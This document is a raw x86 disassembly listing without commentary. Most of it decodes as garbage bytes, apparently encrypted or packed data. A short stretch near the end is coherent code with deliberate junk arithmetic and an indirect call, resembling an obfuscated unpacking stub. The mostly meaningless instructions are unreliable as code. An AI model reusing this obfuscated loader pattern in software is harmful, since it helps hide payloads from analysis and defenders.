  40cd16:	mov    al,0xeb
  40cd18:	mov    WORD PTR cs:[ebx],?
  40cd1b:	add    al,0x17
  40cd1d:	aad    0xa7
  40cd1f:	pop    esi
  40cd20:	mov    al,al
  40cd22:	mov    bh,BYTE PTR [eax]
  40cd24:	nop
  40cd25:	dec    edx
  40cd26:	arpl   WORD PTR [ebx],cx
  40cd28:	or     ah,BYTE PTR [ecx+0x73]
  40cd2b:	cmp    eax,0xa03d8049
  40cd30:	dec    edx
  40cd31:	in     al,dx
  40cd32:	(bad)  
  40cd34:	pop    ebx
  40cd35:	repnz (bad) 
  40cd37:	addr16 (bad) 
  40cd39:	pop    edi
  40cd3a:	sahf   
  40cd3b:	xchg   ebx,eax
  40cd3c:	inc    ecx
  40cd3d:	out    dx,al
  40cd3e:	push   esi
  40cd3f:	pushf  
  40cd40:	xor    DWORD PTR [ecx],edx
  40cd42:	cs stos DWORD PTR es:[edi],eax
  40cd44:	adc    al,0x58
  40cd46:	(bad)  
  40cd48:	and    al,0xaf
  40cd4a:	inc    edx
  40cd4b:	hlt    
  40cd4c:	push   esi
  40cd4d:	repz imul esi,edi,0xad74bc0c
  40cd54:	or     dh,ch
  40cd56:	xchg   ebx,eax
  40cd57:	xchg   DWORD PTR [ebp-0x2eba693e],ebp
  40cd5d:	leave  
  40cd5e:	lahf   
  40cd5f:	xchg   esi,eax
  40cd60:	mov    esi,0x6c45fc81
  40cd65:	aas    
  40cd66:	xlat   BYTE PTR ds:[ebx]
  40cd67:	xchg   ecx,eax
  40cd68:	push   eax
  40cd69:	fstp   TBYTE PTR [ecx-0x384ad515]
  40cd6f:	inc    ebx
  40cd70:	cmc    
  40cd71:	sbb    al,0xc0
  40cd73:	or     edx,edi
  40cd75:	inc    esi
  40cd76:	(bad)  
  40cd77:	and    BYTE PTR [ebx-0x35224284],0x4e
  40cd7e:	or     al,0x45
  40cd80:	mov    eax,ebp
  40cd82:	add    BYTE PTR [esi+0x2808aed4],0x24
  40cd89:	fisubr WORD PTR [ecx+0x29d204eb]
  40cd8f:	in     al,dx
  40cd90:	sub    BYTE PTR [ecx],dh
  40cd92:	les    ecx,FWORD PTR [edx-0x74fb4af8]
  40cd98:	inc    ebp
  40cd99:	mov    ch,0x9c
  40cd9b:	xchg   edi,eax
  40cd9c:	mov    al,ds:0xb48c3a83
  40cda1:	gs push ss
  40cda3:	jbe    0x40cde4
  40cda5:	mov    WORD PTR [ebx+eax*1],es
  40cda8:	(bad)  
  40cda9:	(bad)  
  40cdaa:	paddq  mm2,QWORD PTR [edx-0x23]
  40cdae:	sbb    BYTE PTR [edx+0x32337131],bl
  40cdb4:	fs push ss
  40cdb6:	mov    ds:0x9fe4b45a,eax
  40cdbb:	retf   0x4f2f
  40cdbe:	jp     0x40cd72
  40cdc0:	mov    WORD PTR [ebp-0x7f5120c2],ss
  40cdc6:	out    0x17,al
  40cdc8:	pop    ss
  40cdc9:	retf   0xf5f9
  40cdcc:	pop    esp
  40cdcd:	scas   eax,DWORD PTR es:[edi]
  40cdce:	mov    ah,0xb2
  40cdd0:	sub    al,0xf3
  40cdd2:	sbb    eax,0xa2609eb0
  40cdd7:	push   ebx
  40cdd8:	test   al,0xa5
  40cdda:	pop    ecx
  40cddb:	inc    ecx
  40cddc:	push   es
  40cddd:	mov    eax,ss
  40cddf:	lods   al,BYTE PTR ds:[esi]
  40cde0:	jb     0x40ce53
  40cde2:	pop    esp
  40cde3:	mov    WORD PTR [ecx+0x2651bb0f],fs
  40cde9:	ds mov edx,0x433cffab
  40cdef:	pop    ecx
  40cdf0:	ret    0x24f
  40cdf3:	sub    ch,BYTE PTR [eax+edx*4]
  40cdf6:	sbb    edx,DWORD PTR [eax+0x2bf22eb2]
  40cdfc:	sbb    ch,BYTE PTR ds:0xc27b9e5
  40ce02:	vpmacsdd ymm9,ymm3,YMMWORD PTR [edi-0x4f8c5a1a],ymm2
  40ce0c:	jp     0x40ce21
  40ce0e:	daa    
  40ce0f:	adc    bh,BYTE PTR [eax+0x73b36681]
  40ce15:	pop    ecx
  40ce16:	mov    cl,0xc8
  40ce18:	icebp  
  40ce19:	push   es
  40ce1a:	jmp    0x40ce6f
  40ce1c:	push   ss
  40ce1d:	pop    esp
  40ce1e:	hlt    
  40ce1f:	(bad)  
  40ce20:	ss adc al,0x5f
  40ce23:	sub    dh,BYTE PTR [edx-0x48]
  40ce26:	imul   esp,DWORD PTR [esi-0x6be4195c],0x527db896
  40ce30:	nop
  40ce31:	das    
  40ce32:	pushf  
  40ce33:	lods   eax,DWORD PTR ds:[esi]
  40ce34:	ret    0x1d8e
  40ce37:	adc    ebx,edi
  40ce39:	inc    esp
  40ce3a:	lock and al,0xeb
  40ce3d:	jne    0x40ce96
  40ce3f:	and    ebp,DWORD PTR [ebx-0x3d]
  40ce42:	pop    ebx
  40ce43:	push   edi
  40ce44:	adc    BYTE PTR [ecx+0x48ce86b2],dl
  40ce4a:	fdivr  QWORD PTR [eax-0x30489a45]
  40ce50:	rcl    cl,0x12
  40ce53:	inc    esp
  40ce54:	outs   dx,BYTE PTR ds:[esi]
  40ce55:	iret   
  40ce56:	rcr    BYTE PTR [esi*2-0x15a0b47],cl
  40ce5d:	cmp    DWORD PTR [eax-0x1893f5f8],0xffffffbd
  40ce64:	test   BYTE PTR [ecx+0x50],ch
  40ce67:	xor    dh,ah
  40ce69:	and    BYTE PTR [ecx-0x61ad6bf2],cl
  40ce6f:	das    
  40ce70:	jbe    0x40ce78
  40ce72:	into   
  40ce73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce74:	das    
  40ce75:	in     eax,0x20
  40ce77:	sub    ebx,DWORD PTR [edx+esi*8-0x48d794cf]
  40ce7e:	pop    ds
  40ce7f:	push   ds
  40ce80:	sub    esp,DWORD PTR [eax-0x37ff9083]
  40ce86:	push   cs
  40ce87:	pop    edi
  40ce88:	xchg   esp,eax
  40ce89:	imul   ebx,edx,0x2f4d072f
  40ce8f:	aad    0x7d
  40ce91:	leave  
  40ce92:	mov    cl,0xd2
  40ce94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce95:	xor    bl,bl
  40ce97:	xchg   ebp,eax
  40ce98:	in     al,dx
  40ce99:	out    0x39,eax
  40ce9b:	inc    esi
  40ce9c:	jno    0x40ce42
  40ce9e:	mov    ecx,0xfd08aa1a
  40cea3:	hlt    
  40cea4:	pop    edx
  40cea5:	arpl   WORD PTR [esi+0x68],sp
  40cea8:	out    0x2c,al
  40ceaa:	aas    
  40ceab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ceac:	ror    DWORD PTR [ecx+0x56b337f6],0x7c
  40ceb3:	mov    WORD PTR [esi],fs
  40ceb5:	mov    bl,0x5a
  40ceb7:	sub    esp,esi
  40ceb9:	xchg   esp,eax
  40ceba:	(bad)  
  40cebb:	mov    ch,0xfe
  40cebd:	clc    
  40cebe:	test   DWORD PTR [ecx+0x3ce9fdc],ecx
  40cec4:	fimul  DWORD PTR [ecx-0x8]
  40cec7:	cmp    ch,BYTE PTR [ebp-0x27]
  40ceca:	jbe    0x40ceed
  40cecc:	stc    
  40cecd:	and    DWORD PTR [edx+0x2d],0xb8286d60
  40ced4:	pop    ss
  40ced5:	(bad)  
  40ced7:	shr    DWORD PTR [esi-0x7c],1
  40ceda:	std    
  40cedb:	jl     0x40cf1d
  40cedd:	aam    0xac
  40cedf:	imul   esp,eax,0xffffffb2
  40cee2:	(bad)  
  40cee3:	data16 adc dh,ch
  40cee6:	pusha  
  40cee7:	xor    al,0x3d
  40cee9:	call   0xe2aa6279
  40ceee:	bound  esi,QWORD PTR [edi]
  40cef0:	cmc    
  40cef1:	mov    ah,0x24
  40cef3:	shr    BYTE PTR [edx+edx*1-0x6a7c09b7],cl
  40cefa:	jmp    0x7e63:0x2a73dbdd
  40cf01:	test   eax,0x22b0aaba
  40cf06:	adc    esi,DWORD PTR [esi-0x3e390211]
  40cf0c:	and    eax,0x59fe4dc
  40cf11:	inc    ebp
  40cf12:	push   edx
  40cf13:	(bad)  
  40cf14:	not    DWORD PTR [ebx+0x4e]
  40cf17:	push   ds
  40cf18:	mov    edx,ecx
  40cf1a:	mov    esi,0xe59d74f2
  40cf1f:	add    al,0x92
  40cf21:	mov    ah,0x3e
  40cf23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf24:	test   al,0x7a
  40cf26:	add    edx,DWORD PTR [esi-0x11]
  40cf29:	adc    ebp,esp
  40cf2b:	scas   al,BYTE PTR es:[edi]
  40cf2c:	test   ch,ch
  40cf2e:	xchg   ebx,eax
  40cf2f:	lds    ecx,FWORD PTR [ebx+0x14]
  40cf32:	stc    
  40cf33:	aas    
  40cf34:	mov    eax,?
  40cf36:	std    
  40cf37:	adc    esp,edx
  40cf39:	mov    edx,0xf667fcaf
  40cf3e:	and    al,0x9a
  40cf40:	int    0x57
  40cf42:	into   
  40cf43:	sub    dl,bl
  40cf45:	ficom  WORD PTR [eax+0x31fda7e0]
  40cf4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf4c:	je     0x40cee8
  40cf4e:	cs sbb eax,0x68dcd957
  40cf54:	mov    eax,0x8a3e66d3
  40cf59:	in     al,dx
  40cf5a:	add    ch,BYTE PTR es:[ebx+0x27d7552]
  40cf61:	xlat   BYTE PTR ds:[ebx]
  40cf62:	in     al,0x0
  40cf64:	int3   
  40cf65:	ror    DWORD PTR [ebx],0x8b
  40cf68:	mov    ecx,0x39417d37
  40cf6d:	pop    esi
  40cf6e:	or     BYTE PTR [ebx+0x5f],dl
  40cf71:	das    
  40cf72:	xchg   edi,eax
  40cf73:	cwde   
  40cf74:	cs mov bh,0x67
  40cf77:	push   ebx
  40cf78:	cmc    
  40cf79:	shl    DWORD PTR [ecx],0x69
  40cf7c:	cmp    eax,0xa77498dc
  40cf81:	pop    ecx
  40cf82:	xchg   ebx,eax
  40cf83:	xor    BYTE PTR [ebx+0x75d86920],dh
  40cf89:	ss lock push cs
  40cf8c:	sbb    al,0x24
  40cf8e:	ss iret 
  40cf90:	stos   BYTE PTR es:[edi],al
  40cf91:	mov    bh,0x75
  40cf93:	ja     0x40cfc5
  40cf95:	loop   0x40cf91
  40cf97:	mov    DWORD PTR [edx-0x51],esi
  40cf9a:	fst    QWORD PTR [eax]
  40cf9c:	data16 aam 0x92
  40cf9f:	test   al,0xb6
  40cfa1:	hlt    
  40cfa2:	mov    fs,edi
  40cfa4:	test   DWORD PTR [edi+0x170dbd96],edx
  40cfaa:	mov    BYTE PTR [edx],ch
  40cfac:	mov    edx,0x1e9b3bc0
  40cfb1:	scas   eax,DWORD PTR es:[edi]
  40cfb2:	inc    esp
  40cfb3:	inc    esp
  40cfb4:	retf   0xdd5d
  40cfb7:	mov    eax,ds:0xd68f5897
  40cfbc:	js     0x40d003
  40cfbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfbf:	std    
  40cfc0:	add    eax,0xe7341101
  40cfc5:	and    DWORD PTR [ecx+0x6a],ebx
  40cfc8:	test   DWORD PTR [ebx],esi
  40cfca:	xchg   sp,ax
  40cfcc:	sub    al,0x14
  40cfce:	repz fstp DWORD PTR [esi-0x79e7aac]
  40cfd5:	call   0xb9e:0xfebeaa26
  40cfdc:	mov    eax,0xc661fa01
  40cfe1:	push   esp
  40cfe2:	stc    
  40cfe3:	shl    BYTE PTR [ecx+eax*1+0x7b5fe3d1],0x81
  40cfeb:	push   ecx
  40cfec:	xchg   DWORD PTR [esi],ebp
  40cfee:	stos   DWORD PTR es:[edi],eax
  40cfef:	gs test al,0xc2
  40cff2:	jns    0x40cfa4
  40cff4:	aas    
  40cff5:	pop    esp
  40cff6:	out    0x20,al
  40cff8:	outs   dx,DWORD PTR ds:[esi]
  40cff9:	dec    ecx
  40cffa:	push   ss
  40cffb:	imul   ecx,DWORD PTR [ebx+0x5b24d0a0],0x25e811e9
  40d005:	and    BYTE PTR [eax],bl
  40d007:	inc    ecx
  40d008:	dec    esi
  40d009:	in     al,0x51
  40d00b:	std    
  40d00c:	call   0x41aa93c
  40d011:	sti    
  40d012:	scas   eax,DWORD PTR es:[edi]
  40d013:	jmp    0x374d:0x50f2e780
  40d01a:	push   esi
  40d01b:	xor    DWORD PTR [ebx],edx
  40d01d:	jne    0x40d04c
  40d01f:	adc    BYTE PTR [esi-0x65],al
  40d022:	and    eax,0x45d4a1f
  40d027:	scas   eax,DWORD PTR es:[edi]
  40d028:	pop    es
  40d029:	mov    ebp,0x3c0c7345
  40d02e:	sub    al,0x83
  40d030:	(bad)  
  40d031:	cwde   
  40d032:	aad    0x9f
  40d034:	mov    ah,0x27
  40d036:	adc    al,0xec
  40d038:	ret    0x4b30
  40d03b:	push   0xd172c58a
  40d040:	bound  ebp,QWORD PTR [edx+0x5]
  40d043:	sbb    ebp,DWORD PTR [edi+0x4f]
  40d046:	push   edi
  40d047:	mov    cl,BYTE PTR [ebp+esi*8+0x1de0d40a]
  40d04e:	dec    esi
  40d04f:	add    eax,0xe66b0759
  40d054:	fdivr  DWORD PTR [esi+0x16]
  40d057:	pop    ss
  40d058:	test   BYTE PTR [esi+0x57],ch
  40d05b:	dec    ebp
  40d05c:	mov    dh,0x19
  40d05e:	not    BYTE PTR [edi+0x7]
  40d061:	shl    DWORD PTR [esi-0x2ce32769],0x68
  40d068:	ja     0x40d056
  40d06a:	outs   dx,BYTE PTR ds:[esi]
  40d06b:	push   cs
  40d06c:	ret    
  40d06d:	push   0xffffffb4
  40d06f:	mov    ds:0xbc75bc54,eax
  40d074:	adc    esi,edi
  40d076:	loop   0x40d0ea
  40d078:	lea    esi,[eax]
  40d07a:	stos   DWORD PTR es:[edi],eax
  40d07b:	push   esi
  40d07c:	in     al,dx
  40d07d:	or     BYTE PTR [edi-0x41be6082],0x29
  40d084:	iret   
  40d085:	mov    eax,0x7ec2f6e7
  40d08a:	mov    edx,0x623e18d1
  40d08f:	jb     0x40d07d
  40d091:	popf   
  40d092:	ds or  al,0x19
  40d095:	clc    
  40d096:	mov    DWORD PTR [ebx-0x51362782],ecx
  40d09c:	(bad)  [ebx+0x178e1c1c]
  40d0a2:	mov    al,BYTE PTR [edx]
  40d0a4:	push   ds
  40d0a5:	lahf   
  40d0a6:	enter  0x8293,0x5a
  40d0aa:	cmp    edx,DWORD PTR [esp+eax*8-0x7b6e0e38]
  40d0b1:	pop    ebp
  40d0b2:	inc    ebx
  40d0b3:	mov    ebx,0x32252f20
  40d0b8:	xchg   ch,ah
  40d0ba:	pop    ebp
  40d0bb:	dec    ebp
  40d0bc:	push   ds
  40d0bd:	jmp    0x40d04d
  40d0bf:	inc    ecx
  40d0c0:	pop    esp
  40d0c1:	lds    ebx,FWORD PTR [ebp-0x59]
  40d0c4:	cmp    DWORD PTR [edi+0x402b998c],esp
  40d0ca:	mov    al,ds:0xd44da057
  40d0cf:	sub    dl,BYTE PTR [ecx+eiz*8-0x11]
  40d0d3:	mov    al,0x59
  40d0d5:	xor    ebp,esp
  40d0d7:	xor    cl,bl
  40d0d9:	xchg   esp,eax
  40d0da:	jle    0x40d0bf
  40d0dc:	jmp    0x3ac421f2
  40d0e1:	cli    
  40d0e2:	test   al,0x51
  40d0e4:	add    BYTE PTR [ebx-0x63e564b0],0x51
  40d0eb:	pop    ss
  40d0ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0ed:	fwait
  40d0ee:	jmp    0xa1c3ffb9
  40d0f3:	arpl   WORD PTR [edi],si
  40d0f5:	push   ecx
  40d0f6:	xchg   edx,eax
  40d0f7:	pop    ebx
  40d0f8:	cmp    eax,0xfa4501c6
  40d0fd:	dec    eax
  40d0fe:	inc    eax
  40d0ff:	adc    eax,0xbf6fdfac
  40d104:	icebp  
  40d105:	adc    ecx,DWORD PTR [eax+0x21e40399]
  40d10b:	or     al,BYTE PTR [edx-0x3ccc07ab]
  40d111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d112:	pop    ebp
  40d113:	js     0x40d0f4
  40d115:	(bad)  
  40d116:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d118:	fiadd  DWORD PTR [eax+0x4bf3d1c7]
  40d11e:	(bad)  ss:[edi-0x13]
  40d122:	ss jne 0x40d168
  40d125:	je     0x40d1a6
  40d127:	pop    eax
  40d128:	adc    cl,BYTE PTR [ecx+0x99ab17d]
  40d12e:	push   ecx
  40d12f:	mov    bh,0x1b
  40d131:	jmp    0xaca8:0xaddc59dc
  40d138:	mov    dh,0xf5
  40d13a:	sub    eax,0x2a9662d4
  40d13f:	rcl    BYTE PTR [ebx],cl
  40d141:	xor    bh,BYTE PTR [ebp+0x32f445fc]
  40d147:	int3   
  40d148:	ret    
  40d149:	mov    ebp,0x82f8344c
  40d14e:	lock jae 0x40d1ba
  40d151:	lods   al,BYTE PTR fs:[esi]
  40d153:	outs   dx,DWORD PTR ds:[esi]
  40d154:	imul   edx,DWORD PTR [esi-0x1e],0xffffffd8
  40d158:	fdiv   QWORD PTR [esi]
  40d15a:	or     BYTE PTR [ebx],cl
  40d15c:	jmp    0x5d6b:0xfcd80ff0
  40d163:	pop    es
  40d164:	outs   dx,BYTE PTR ds:[esi]
  40d165:	pop    ebx
  40d166:	cli    
  40d167:	cmp    ah,al
  40d169:	sub    DWORD PTR [eax],edx
  40d16b:	adc    al,bl
  40d16d:	in     al,dx
  40d16e:	inc    esi
  40d16f:	mov    bh,0x35
  40d171:	rcr    BYTE PTR [edi],1
  40d173:	mov    BYTE PTR [ebp-0x20],0xd4
  40d177:	imul   esi,DWORD PTR [edx],0x43010433
  40d17d:	dec    eax
  40d17e:	mov    ecx,esi
  40d180:	mov    edx,ecx
  40d182:	ins    DWORD PTR es:[edi],dx
  40d183:	push   es
  40d184:	mov    ch,0x4
  40d186:	out    dx,eax
  40d187:	pop    edi
  40d188:	nop
  40d189:	mov    ds:0x769ee2dd,eax
  40d18e:	adc    al,0xcb
  40d190:	inc    ebx
  40d191:	push   esi
  40d192:	inc    eax
  40d193:	(bad)  
  40d194:	dec    esp
  40d195:	jl     0x40d1d2
  40d197:	jge    0x40d1e8
  40d199:	cld    
  40d19a:	and    esp,edx
  40d19c:	data16 into 
  40d19e:	pushf  
  40d19f:	mov    bl,0x7c
  40d1a1:	add    eax,DWORD PTR [esi+0x4f]
  40d1a4:	sahf   
  40d1a5:	sbb    ebp,DWORD PTR [eax-0x7c]
  40d1a8:	xor    ebp,DWORD PTR [edi+0x4c8f59a]
  40d1ae:	inc    esi
  40d1af:	ins    BYTE PTR es:[edi],dx
  40d1b0:	inc    esi
  40d1b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1b2:	or     BYTE PTR [ecx],bh
  40d1b4:	sub    BYTE PTR [ebx],bl
  40d1b6:	mov    esi,0xc7a38a6
  40d1bb:	cli    
  40d1bc:	scas   al,BYTE PTR es:[edi]
  40d1bd:	aas    
  40d1be:	test   edx,0x579e30f9
  40d1c4:	pop    eax
  40d1c5:	out    0xe2,al
  40d1c7:	xchg   edx,eax
  40d1c8:	test   al,0xcd
  40d1ca:	cmp    cl,BYTE PTR [ebx]
  40d1cc:	xor    BYTE PTR [ebp+eax*8+0xdc0a2e3],bh
  40d1d3:	jg     0x40d1f9
  40d1d5:	cmp    BYTE PTR [edx+0x7e99a6b4],bl
  40d1db:	add    DWORD PTR [eax+0x62],ebx
  40d1de:	jb     0x40d226
  40d1e0:	xchg   ebp,eax
  40d1e1:	or     BYTE PTR [esi],0xb6
  40d1e4:	(bad)  
  40d1e6:	aas    
  40d1e7:	jb     0x40d25f
  40d1e9:	cmp    BYTE PTR [edi-0x4a],dh
  40d1ec:	sar    DWORD PTR [eax+0x3d2d5102],0xa4
  40d1f3:	das    
  40d1f4:	sbb    esi,ebp
  40d1f6:	aad    0xdd
  40d1f8:	outs   dx,BYTE PTR ds:[esi]
  40d1f9:	jne    0x40d1f2
  40d1fb:	je     0x40d23f
  40d1fd:	pop    esp
  40d1fe:	sub    BYTE PTR [eax-0x70c81130],dh
  40d204:	outs   dx,DWORD PTR ds:[esi]
  40d205:	xor    eax,0xefea3b23
  40d20a:	jg     0x40d194
  40d20c:	sbb    BYTE PTR [eax],al
  40d20e:	(bad)  
  40d20f:	fcmovb st,st(1)
  40d211:	adc    eax,ebx
  40d213:	pop    ebp
  40d214:	cwde   
  40d215:	push   ebp
  40d216:	push   cs
  40d217:	jg     0x40d25f
  40d219:	add    DWORD PTR [edx-0xb],esp
  40d21c:	lods   eax,DWORD PTR ds:[esi]
  40d21d:	xlat   BYTE PTR ds:[ebx]
  40d21e:	lods   eax,DWORD PTR ds:[esi]
  40d21f:	cs mov esp,ecx
  40d222:	iret   
  40d223:	jg     0x40d1df
  40d225:	mov    ecx,0xfb5e3cf2
  40d22a:	mov    ss,WORD PTR [edi-0xfd2fb6a]
  40d230:	clc    
  40d231:	mov    ebp,0x72033fd9
  40d236:	ror    dh,1
  40d238:	inc    edi
  40d239:	xchg   esi,eax
  40d23a:	dec    esi
  40d23b:	shr    DWORD PTR [edi],1
  40d23d:	pop    esi
  40d23e:	dec    esi
  40d23f:	mov    ecx,0x2f6684f6
  40d244:	cmp    eax,0x52acdffe
  40d249:	or     esp,DWORD PTR [esi-0x71101390]
  40d24f:	jle    0x40d261
  40d251:	(bad)  
  40d252:	sahf   
  40d253:	add    dh,bh
  40d255:	pop    edi
  40d256:	hlt    
  40d257:	mul    BYTE PTR ds:0x63549c5e
  40d25d:	xchg   edx,eax
  40d25e:	jae    0x40d204
  40d260:	or     BYTE PTR [ebx+eiz*2+0x27dfe9d9],dh
  40d267:	out    0x15,al
  40d269:	(bad)  
  40d26a:	lods   al,BYTE PTR ds:[esi]
  40d26b:	mov    ah,0x8b
  40d26d:	dec    ebx
  40d26e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d26f:	sti    
  40d270:	lock fsub st(7),st
  40d273:	dec    esi
  40d274:	sti    
  40d275:	cmp    edx,DWORD PTR [ebp+0x6dcc74d]
  40d27b:	add    ch,dh
  40d27d:	xor    edx,DWORD PTR [esi]
  40d27f:	adc    ecx,edx
  40d281:	(bad)
  40d284:	into   
  40d285:	out    dx,al
  40d286:	(bad)  
  40d287:	sbb    eax,0xb8a4cc46
  40d28c:	shr    BYTE PTR [edi+0x64],1
  40d28f:	loope  0x40d262
  40d291:	mov    ah,0x86
  40d293:	leave  
  40d294:	ds aaa 
  40d296:	add    eax,0xe4458bd5
  40d29b:	test   eax,eax
  40d29d:	je     0x40d339
  40d2a3:	mov    DWORD PTR [ebp-0x20],0x0
  40d2aa:	push   edx
  40d2ab:	pop    eax
  40d2ac:	push   0x5
  40d2ae:	sub    edx,eax
  40d2b0:	pop    edx
  40d2b1:	add    edx,0xa
  40d2b4:	push   edx
  40d2b5:	pop    ecx
  40d2b6:	push   0xa
  40d2b8:	dec    ecx
  40d2b9:	pop    ebx
  40d2ba:	dec    ebx
  40d2bb:	xchg   ebx,ecx
  40d2bd:	sub    ebx,ecx
  40d2bf:	xchg   ebx,ecx
  40d2c1:	dec    ecx
  40d2c2:	mov    eax,DWORD PTR [ebp-0x1c]
  40d2c5:	imul   eax,ecx
  40d2c8:	sub    esp,eax
  40d2ca:	mov    DWORD PTR [ebp-0x20],esp
  40d2cd:	mov    eax,DWORD PTR [ebp-0x4]
  40d2d0:	xor    eax,esi
  40d2d2:	add    eax,edi
  40d2d4:	jmp    0x40d312
  40d2d9:	mov    ecx,DWORD PTR [ebp-0xc]
  40d2dc:	mov    eax,DWORD PTR [ebp+0x8]
  40d2df:	mov    edx,DWORD PTR [ebp+0x14]
  40d2e2:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d2e6:	xor    ecx,esi
  40d2e8:	add    ecx,edi
  40d2ea:	xor    edx,edx
  40d2ec:	div    ecx
  40d2ee:	mov    ecx,DWORD PTR [ebp-0x4]
  40d2f1:	xor    ecx,esi
  40d2f3:	lea    eax,[ecx+eax*1+0x3272fa]
  40d2fa:	mov    ecx,DWORD PTR [ebp+0x8]
  40d2fd:	mov    edx,DWORD PTR [ebp-0x20]
  40d300:	mov    DWORD PTR [edx+ecx*4],eax
  40d303:	mov    eax,DWORD PTR [ebp-0xc]
  40d306:	mov    ecx,DWORD PTR [ebp+0x8]
  40d309:	xor    eax,esi
  40d30b:	lea    eax,[eax+ecx*1+0x3272fa]
  40d312:	mov    DWORD PTR [ebp+0x8],eax
  40d315:	mov    eax,DWORD PTR [ebp-0xc]
  40d318:	mov    ecx,DWORD PTR [ebp+0x14]
  40d31b:	xor    eax,esi
  40d31d:	add    eax,edi
  40d31f:	imul   eax,DWORD PTR [ecx]
  40d322:	mov    ecx,DWORD PTR [ebp-0x4]
  40d325:	mov    edx,DWORD PTR [ebp+0x8]
  40d328:	xor    ecx,esi
  40d32a:	lea    ecx,[ecx+edx*1+0x3272fa]
  40d331:	cmp    ecx,eax
  40d333:	jne    0x40d2d9
  40d339:	mov    eax,DWORD PTR [ebp-0x4]
  40d33c:	xor    eax,esi
  40d33e:	add    eax,edi
  40d340:	mov    DWORD PTR [ebp-0x10],eax
  40d343:	and    ebx,0x6547647
  40d349:	xor    ebx,0x8768765
  40d34f:	xchg   ebx,esi
  40d351:	xor    ebx,ebx
  40d353:	push   esi
  40d354:	mov    esi,ebx
  40d356:	pop    ebx
  40d357:	mov    edx,esi
  40d359:	add    ebx,0x1002
  40d35f:	lea    eax,[ebp-0x18]
  40d362:	add    edx,eax
  40d364:	add    edx,0x5
  40d367:	push   edx
  40d368:	inc    esi
  40d369:	pop    ecx
  40d36a:	dec    ecx
  40d36b:	xchg   ecx,eax
  40d36c:	dec    eax
  40d36d:	xchg   ecx,eax
  40d36e:	dec    ecx
  40d36f:	xchg   ecx,edx
  40d371:	dec    edx
  40d372:	push   edx
  40d373:	mov    edx,ebx
  40d375:	pop    ebx
  40d376:	dec    ebx
  40d377:	call   DWORD PTR [ebx]
  40d379:	cmp    DWORD PTR [ebp+0x10],esi
  40d37c:	je     0x40d39d
  40d382:	xchg   edx,eax
  40d383:	push   0xc
  40d385:	pop    ecx
  40d386:	dec    ecx
  40d387:	push   0x3
  40d389:	pop    ebx
  40d38a:	inc    ebx
  40d38b:	xchg   ebx,ecx
  40d38d:	inc    ecx
  40d38e:	sub    ebx,ecx
  40d390:	xchg   ebx,ecx
  40d392:	dec    ecx
  40d393:	dec    ecx
  40d394:	mov    eax,DWORD PTR [ebp-0x1c]
  40d397:	imul   eax,ecx
  40d39a:	add    esp,eax
  40d39c:	xchg   edx,eax
  40d39d:	push   eax
  40d39e:	xor    ebx,ebx
  40d3a0:	mov    edx,esp
  40d3a2:	dec    edx
  40d3a3:	inc    ebx
  40d3a4:	add    ebx,DWORD PTR [edx+ebx*1]
  40d3a7:	dec    ebx
  40d3a8:	xor    edx,edx
  40d3aa:	add    DWORD PTR [ebp-0x10],ebx
  40d3ad:	pop    ebx
  40d3ae:	mov    eax,DWORD PTR [ebp-0x10]
  40d3b1:	pop    edi
  40d3b2:	pop    esi
  40d3b3:	pop    ebx
  40d3b4:	leave  
  40d3b5:	ret    0x10
  40d3b8:	push   ebp
  40d3b9:	mov    ebp,esp
  40d3bb:	push   ecx
  40d3bc:	or     DWORD PTR ds:0x426f29,0x4a1b
  40d3c6:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40d3cd:	movzx  edx,BYTE PTR ds:0x426f19
  40d3d4:	sub    DWORD PTR ds:0x426f21,edx
  40d3da:	mov    eax,DWORD PTR [ebp-0x4]
  40d3dd:	mov    DWORD PTR ds:0x426e91,0x1a
  40d3e7:	cmp    DWORD PTR ds:0x426e91,0x0
  40d3ee:	je     0x40d421
  40d3f4:	cmp    DWORD PTR ds:0x426e91,0x24
  40d3fb:	jl     0x40d421
  40d401:	jmp    0x40d40f
  40d406:	push   DWORD PTR [ebp-0xc]
  40d409:	call   DWORD PTR ds:0x430a2c
  40d40f:	mov    edx,DWORD PTR ds:0x426e91
  40d415:	dec    edx
  40d416:	mov    DWORD PTR ds:0x426e91,edx
  40d41c:	jmp    0x40d3e7
  40d421:	mov    edx,DWORD PTR [ebp+0x10]
  40d424:	xor    ecx,0x6edc
  40d42a:	jmp    0x40f7c6
  40d42f:	mov    ah,0x4a
  40d431:	hlt    
  40d432:	mov    ebx,0x74b46574
  40d437:	ja     0x40d48b
  40d439:	out    dx,al
  40d43a:	je     0x40d46d
  40d43c:	inc    edi
  40d43d:	cmp    eax,0x7b2a1a5b
  40d442:	jnp    0x40d43c
  40d444:	pushf  
  40d445:	jnp    0x40d4c2
  40d447:	pop    es
  40d448:	add    ah,ch
  40d44a:	sub    al,0xb2
  40d44c:	fisttp QWORD PTR [ebx]
  40d44e:	sar    DWORD PTR [eax-0x50e1d831],cl
  40d454:	jg     0x40d3fb
  40d456:	jo     0x40d3ef
  40d458:	in     al,0x3
  40d45a:	xchg   edi,eax
  40d45b:	mov    dh,0xb0
  40d45d:	fst    DWORD PTR [edx-0x25]
  40d460:	(bad)  
  40d462:	mov    cl,0x59
  40d464:	jle    0x40d494
  40d466:	pop    esi
  40d467:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d468:	or     al,0x81
  40d46a:	and    al,0xb2
  40d46c:	ffree  st(6)
  40d46e:	mov    ds:0x32bd91de,eax
  40d473:	mov    eax,ds:0xe15a3a93
  40d478:	adc    BYTE PTR [edx+0x63],cl
  40d47b:	ret    
  40d47c:	das    
  40d47d:	and    ah,dh
  40d47f:	sbb    BYTE PTR ds:0xc870b8de,dh
  40d485:	and    esi,DWORD PTR [ebp-0x15]
  40d488:	mov    bl,0x22
